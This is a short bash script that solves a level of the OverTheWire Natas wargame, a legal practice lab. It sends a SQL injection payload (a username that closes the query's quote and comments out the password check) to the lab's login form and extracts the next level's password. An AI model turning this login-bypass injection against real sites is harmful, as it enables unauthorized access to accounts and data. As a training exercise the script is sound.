#!/bin/bash
if [ $# -eq 0 ] ; then
  echo "Please pass the password as argument"
  exit
fi

# Simple SQL injection
curl -s --user natas14:$1 --data 'username=natas15" -- &password=a' \
  "http://natas14.natas.labs.overthewire.org/" | grep -E -o \
  "The password for natas15 is .{32}"
